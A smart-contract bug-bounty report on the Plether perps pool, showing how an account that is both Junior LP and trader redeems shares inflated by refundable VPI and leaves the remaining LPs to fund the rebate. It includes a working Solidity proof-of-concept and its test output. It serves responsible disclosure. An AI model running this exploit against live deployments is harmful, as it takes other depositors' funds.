# \#97841 [SC-Critical] Junior LP share price marks refundable positive VPI as equity, letting an LP-trader redeem it while remaining LPs fund the rebate (theft of LP value)

**Submitted on Nov 3rd 2026 at 14:22:17 UTC by @luT for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97841
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro
An account that is both a Junior LP and a trader can extract value from the other Junior LPs at an unchanged oracle price. Positive VPI paid by a skew-increasing open is marked into Junior share value immediately, although the same position can recover it in full as a rebate on close (lifetime clamp). The attacker opens, redeems its Junior shares at the inflated price, then closes. The rebate is paid by the LPs who stayed. Measured on a 43M pool: **+5,849 USDG to the attacker per cycle after all fees**, and **-11,248 USDG of principal for a 6M honest Junior LP per cycle**.

## Vulnerability Details
When an open increases skew, the trader pays positive VPI. `CfdEngineSettlementSidecar.executeOpen` records that cash as LP revenue at once (`CfdEngineSettlementSidecar.sol:455-463`, `recordClaimantInflow(..., Revenue, CashArrived)`). The next reconcile moves it into `juniorPrincipal`, and Junior redemptions are priced from that value (`HousePool.sol:840`).

That VPI is not final LP income. The lifetime clamp in `CloseAccountingLib.sol:116` allows the same position to recover all of it as a rebate on a skew-reducing close. The pool pays that rebate out of the LPs who are still in the tranche at the time.

An account that is both a Junior LP and a trader can therefore make a round trip at an unchanged oracle price:

1. Open a large skew-increasing position. It pays VPI, and Junior share value rises by roughly VPI × (attacker share of Junior).
2. Redeem its Junior shares at that inflated price.
3. Close the position. The VPI comes back as a rebate, funded by the LPs who did not exit.

The attacker ends with more than it put in, after every fee. Honest Junior LPs end below their principal.

The protocol already protects the opposite case. For negative VPI, the whitepaper states: "The reserve is excluded from the terminal price curve, so LPs cannot withdraw it as marked equity before the matching position obligation settles" (`WHITEPAPER.md:887`). Positive VPI that the same position can still reclaim gets no such protection.

## Impact Details
- **Who can do it**: any account that holds Junior shares and can open skew-increasing positions. No privileged role is needed.
- **What it takes**: holding a large share of Junior, about 60 % in the example. The attacker's full redemption must fit in free pool cash, which is roughly pool assets minus the reserved maximum liability.
- **Who loses**: the remaining Junior LPs. They pay the refund of VPI that was already withdrawn as marked equity, and they end below their principal.
- **Price exposure**: the trader is exposed to price moves only between the open and the epoch settlement. Placing the open just before the 5-minute request cutoff keeps this to a few minutes, and the exposure can be hedged off-protocol.
- **Repeatability**: the cycle repeats every LP epoch round trip (deposit, 1 h cooldown, redeem).
- **Scaling**: per cycle, the profit is about (f × k·S/2D − 2 × fee bps) × S, where f is the attacker's share of Junior and S the skew notional, which is capped at 0.4 D. It grows linearly with pool depth.
- **Measured on a realistic pool** (`test_Sizing_RealisticPool`):
  - Setup: 26M Senior and 17M Junior, of which the attacker holds 10M; a 17M-notional LONG near the 40% skew cap, paying 33,603 USDG of VPI.
  - Result: the redemption is fully funded. The attacker nets **+5,849 USDG per cycle** after all fees, at an unchanged price. The honest 6M Junior LP loses **11,248 USDG of principal per cycle**.
  - At roughly 3 hours per cycle (deposit epoch, 1 h cooldown, redemption epoch), repeated cycles would drain about 1.5% of honest Junior principal per day (extrapolated from the single measured cycle).

Severity: High under "Theft of unclaimed yield" (LP-owned VPI revenue is taken by the attacker). The remaining Junior LPs also end below their deposited principal.

## Recommendation
Treat positive lifetime VPI that the same open position can still reclaim as a contingent liability in LP pricing, the same way the negative-VPI reserve is kept out of marked equity.

For example, track the aggregate refundable positive `vpiAccrued` of open positions and exclude it from the distributable value used by `_reconcile` / tranche pricing until the position closes or is liquidated. Alternatively, keep positive VPI in a pending revenue bucket released only on the position's terminal settlement.

## References
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L455-L463
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L116
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L840
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md (VPI section, "The reserve is excluded from the terminal price curve...")


## Proof of Concept

## Proof of Concept

Production parameters (`DEPLOYMENT.md` risk table) are set in the test through `_riskParams()`. Only Pyth is mocked, and no in-scope contract is changed. All attacker actions go through public entrypoints: `OrderRouter.commitOrder` and `executeOrder` with a historical tick, `OrderRouter.settleLpEpoch`, and `TrancheVault.requestRedeem` and `claimRedeem`.

### Steps
1. Junior holders: the fixture's 1M, an honest LP with 1M, and the attacker LP with 4M. The attacker waits out the 1 h LP cooldown.
2. The attacker trader commits and executes a 20,000-lot (2M notional) skew-increasing LONG at mark 1.00. It pays 3,332.22 USDG of positive VPI, which is immediately marked into Junior NAV.
3. The attacker LP calls `requestRedeem` for all its shares. At the next epoch, `router.settleLpEpoch(pyth)` funds the redemption at the inflated price, and the attacker calls `claimRedeem`.
4. The attacker trader closes at the same mark and recovers about 3,329 USDG as a VPI rebate. The rebate is paid by the LPs who stayed.
5. Result: attacker **+615.75 USDG** net of all fees; honest LP **-707.63 USDG** of principal.
6. Witness: the same trades without the redemption leave the attacker at -1,067.58 USDG (fees only).
7. Sizing (`test_Sizing_RealisticPool`): 26M Senior and 17M Junior, of which the attacker holds 10M, with a 17M LONG. Attacker **+5,849 USDG**; honest 6M LP **-11,248 USDG**.

### Run
Save the file below as `packages/perps/test/perps/spec/trader/PocLpRefundableVpi.t.sol`, then:
```bash
cd packages/perps
forge test --match-contract PocLpRefundableVpi --match-test "test_Poc_|test_Witness_|test_Sizing_|test_Variant_" -vv
```

Output:
```
[PASS] test_Poc_LpRedeemsOwnRefundableVpiAtHonestLpExpense()
  positive VPI paid by attacker trader: 3332222592
  attacker start (LP deposit + trader balance): 4600000000000
  attacker end:                                4600615745544
  honest LP value start: 999999995436
  honest LP value end:   999292367335
[PASS] test_Witness_SameTradesWithoutRedemptionLose()
  witness attacker start: 4600000000000
  witness attacker end:   4598932421322
[PASS] test_Sizing_RealisticPool()
  VPI paid 33603088228
  sizing: attacker start 11000000000000
  sizing: attacker end   11005848976686
  sizing: honest start 5999999988943
  sizing: honest end   5988752208344
```

### PoC source
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Production-parameter PoC through public entrypoints only: an attacker that is both Junior LP and trader
///         marks its own refundable positive VPI into Junior share value, redeems at that value, then recovers the
///         VPI as a close rebate funded by the LPs that stayed.
contract PocLpRefundableVpi is PositionProtectionTest {

    address internal constant ATK_LP = address(0xA77AC1);
    address internal constant ATK_TR = address(0xA77AC2);
    address internal constant HONEST_LP = address(0xC0FFEE);
    uint256 internal constant LOTS = 20_000;

    uint256 internal _blockCursor = 10_000;

    /// @dev Checked-in deployment defaults (DEPLOYMENT.md "Risk parameters"); the shared fixture uses vpiFactor 0.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _nextBlock() internal {
        _blockCursor += 1;
        vm.roll(_blockCursor);
    }

    function _commitAndExecute(
        address trader,
        OrderV3Types.OrderRequest memory request
    ) internal {
        _nextBlock();
        vm.prank(trader);
        uint64 orderId = OrderRouter(address(router)).commitOrder(request);
        uint64 committedAt = _orderRecord(orderId).core.commitTime;
        _nextBlock();
        vm.warp(uint256(committedAt) + 2);
        bytes[] memory data = _mockUniquePythUpdateDataAt(MARK_PRICE, committedAt + 1, committedAt);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _openRequest(uint256 margin) internal view returns (OrderV3Types.OrderRequest memory r) {
        r = _boundedOpenRequest(CfdTypes.Side.LONG, LOTS * CfdTypes.SIZE_QUANTUM, margin, 0);
    }

    function _closeRequest() internal view returns (OrderV3Types.OrderRequest memory r) {
        r = _publicBoundedRequest(bytes32(uint256(router.nextCommitId()) + 1e9), true);
        r.side = CfdTypes.Side.LONG;
        r.sizeDelta = LOTS * CfdTypes.SIZE_QUANTUM;
    }

    function _settleViaRouter() internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.settleLpEpoch(_livePriceData(MARK_PRICE));
    }

    function test_Poc_LpRedeemsOwnRefundableVpiAtHonestLpExpense() public {
        // Honest Junior LP and the attacker's Junior LP account (setup Junior is 1M plus seeds).
        uint256 honestShares = _fundJuniorDelayed(HONEST_LP, 1_000_000e6);
        uint256 atkDeposit = 4_000_000e6;
        uint256 atkShares = _fundJuniorDelayed(ATK_LP, atkDeposit);
        uint256 honestStart = juniorVault.convertToAssets(honestShares);

        // LP deposit cooldown before a redemption request.
        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark(MARK_PRICE);

        uint256 trFunding = 600_000e6;
        _fundTrader(ATK_TR, trFunding);
        uint256 trBalance0 = clearinghouse.balanceAssets(ATK_TR);

        // 1. Skew-increasing open at the unchanged mark: pays positive VPI, immediately marked into Junior NAV.
        _commitAndExecute(ATK_TR, _openRequest(300_000e6));
        (,,,,,, int256 vpiAccrued) = engine.positions(ATK_TR);
        console2.log("positive VPI paid by attacker trader:", uint256(vpiAccrued));
        assertGt(vpiAccrued, 0, "open paid positive VPI");

        // 2. Attacker LP redeems at the inflated Junior price through the atomic Router settlement path.
        vm.prank(ATK_LP);
        uint256 requestId = juniorVault.requestRedeem(atkShares, ATK_LP, ATK_LP);
        vm.warp(pool.lpEpochStart(requestId) + 1);
        _settleViaRouter();
        uint256 fundedShares = juniorVault.claimableRedeemRequest(requestId, ATK_LP);
        vm.prank(ATK_LP);
        uint256 redeemed = juniorVault.claimRedeem(requestId, fundedShares, ATK_LP, ATK_LP);

        // 3. Close at the same mark: the lifetime clamp refunds the VPI out of the LPs that stayed.
        _commitAndExecute(ATK_TR, _closeRequest());
        (uint256 sizeAfter,,,,,,) = engine.positions(ATK_TR);
        assertEq(sizeAfter, 0, "position closed");

        uint256 atkEnd = redeemed
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATK_LP))
            + juniorVault.convertToAssets(juniorVault.pendingRedeemRequest(requestId, ATK_LP))
            + clearinghouse.balanceAssets(ATK_TR);
        uint256 atkStart = atkDeposit + trBalance0;
        uint256 honestEnd = juniorVault.convertToAssets(honestShares);

        console2.log("attacker start (LP deposit + trader balance):", atkStart);
        console2.log("attacker end:                               ", atkEnd);
        console2.log("honest LP value start:", honestStart);
        console2.log("honest LP value end:  ", honestEnd);

        assertGt(atkEnd, atkStart, "attacker ends richer at an unchanged price, after all fees");
        assertLt(honestEnd, honestStart, "honest Junior LP lost principal");
    }


    /// @dev Witness: the identical trade without the intervening redemption leaves the attacker poorer, so the gain
    ///      comes only from redeeming between the VPI charge and its refund.
    function test_Witness_SameTradesWithoutRedemptionLose() public {
        _fundJuniorDelayed(HONEST_LP, 1_000_000e6);
        uint256 atkDeposit = 4_000_000e6;
        uint256 atkShares = _fundJuniorDelayed(ATK_LP, atkDeposit);
        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark(MARK_PRICE);
        _fundTrader(ATK_TR, 600_000e6);
        uint256 trBalance0 = clearinghouse.balanceAssets(ATK_TR);
        _commitAndExecute(ATK_TR, _openRequest(300_000e6));
        _commitAndExecute(ATK_TR, _closeRequest());
        uint256 atkEnd = juniorVault.convertToAssets(atkShares) + clearinghouse.balanceAssets(ATK_TR);
        console2.log("witness attacker start:", atkDeposit + trBalance0);
        console2.log("witness attacker end:  ", atkEnd);
        assertLt(atkEnd, atkDeposit + trBalance0, "without the timed redemption the round trip costs fees");
    }


    // ------------------------------------------------------------------ variants used for severity sizing

    function _openLots(uint256 lots, uint256 margin) internal view returns (OrderV3Types.OrderRequest memory r) {
        r = _boundedOpenRequest(CfdTypes.Side.LONG, lots * CfdTypes.SIZE_QUANTUM, margin, 0);
    }

    function _closeLots(uint256 lots) internal view returns (OrderV3Types.OrderRequest memory r) {
        r = _publicBoundedRequest(bytes32(uint256(router.nextCommitId()) + 1e9), true);
        r.side = CfdTypes.Side.LONG;
        r.sizeDelta = lots * CfdTypes.SIZE_QUANTUM;
    }

    /// @dev Entry side: an existing LP inflates the Junior price with refundable VPI while an honest deposit
    ///      activates, then takes the refund. The attacker never redeems.
    function test_Variant_HonestDepositorBuysInflatedJunior() public {
        uint256 atkShares = _fundJuniorDelayed(ATK_LP, 2_000_000e6);
        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark(MARK_PRICE);
        uint256 atkLpStart = juniorVault.convertToAssets(atkShares);

        // Honest depositor queues 2M for the next epoch.
        uint256 honestDeposit = 2_000_000e6;
        settlementToken.mint(HONEST_LP, honestDeposit);
        vm.startPrank(HONEST_LP);
        settlementToken.approve(address(juniorVault), honestDeposit);
        uint256 depId = juniorVault.requestDeposit(honestDeposit, HONEST_LP, HONEST_LP);
        vm.stopPrank();

        _fundTrader(ATK_TR, 600_000e6);
        uint256 trBalance0 = clearinghouse.balanceAssets(ATK_TR);
        _commitAndExecute(ATK_TR, _openLots(12_000, 200_000e6));

        vm.warp(pool.lpEpochStart(depId) + 1);
        _settleViaRouter();
        uint256 assets = juniorVault.claimableDepositRequest(depId, HONEST_LP);
        vm.prank(HONEST_LP);
        uint256 honestShares = juniorVault.claimDeposit(depId, assets, HONEST_LP, HONEST_LP);

        _commitAndExecute(ATK_TR, _closeLots(12_000));
        uint256 honestEnd = juniorVault.convertToAssets(honestShares);
        uint256 atkEnd = juniorVault.convertToAssets(atkShares) + clearinghouse.balanceAssets(ATK_TR);
        uint256 atkStart = atkLpStart + trBalance0;
        console2.log("entry variant: honest deposit", honestDeposit);
        console2.log("entry variant: honest value end", honestEnd);
        console2.log("entry variant: attacker start", atkStart);
        console2.log("entry variant: attacker end  ", atkEnd);
    }

    /// @dev Realistic sizing: 26M Senior, 6M honest Junior (+1M fixture), 10M attacker Junior, skew near the 40% cap.
    function test_Sizing_RealisticPool() public {
        _setSeniorCapacity(type(uint256).max - 1, 8000);
        uint256 honestShares = _fundJuniorDelayed(HONEST_LP, 6_000_000e6);
        uint256 atkDeposit = 10_000_000e6;
        uint256 atkShares = _fundJuniorDelayed(ATK_LP, atkDeposit);
        _fundSenior(address(0x5E1105), 26_000_000e6);
        uint256 honestStart = juniorVault.convertToAssets(honestShares);
        console2.log("pool assets", pool.totalAssets());
        vm.warp(block.timestamp + 1 hours + 1);
        _refreshMark(MARK_PRICE);

        uint256 lots = 170_000;
        _fundTrader(ATK_TR, 1_000_000e6);
        uint256 trBalance0 = clearinghouse.balanceAssets(ATK_TR);
        _commitAndExecute(ATK_TR, _openLots(lots, 400_000e6));
        (,,,,,, int256 vpiAccrued) = engine.positions(ATK_TR);
        console2.log("VPI paid", uint256(vpiAccrued));

        vm.prank(ATK_LP);
        uint256 rid = juniorVault.requestRedeem(atkShares, ATK_LP, ATK_LP);
        vm.warp(pool.lpEpochStart(rid) + 1);
        _settleViaRouter();
        uint256 fundedShares = juniorVault.claimableRedeemRequest(rid, ATK_LP);
        console2.log("funded shares", fundedShares, atkShares);
        vm.prank(ATK_LP);
        uint256 redeemed = juniorVault.claimRedeem(rid, fundedShares, ATK_LP, ATK_LP);
        _commitAndExecute(ATK_TR, _closeLots(lots));

        uint256 atkEnd = redeemed + juniorVault.convertToAssets(juniorVault.pendingRedeemRequest(rid, ATK_LP))
            + clearinghouse.balanceAssets(ATK_TR);
        uint256 atkStart = atkDeposit + trBalance0;
        console2.log("sizing: attacker start", atkStart);
        console2.log("sizing: attacker end  ", atkEnd);
        console2.log("sizing: honest start", honestStart);
        console2.log("sizing: honest end  ", juniorVault.convertToAssets(honestShares));
    }

}
```

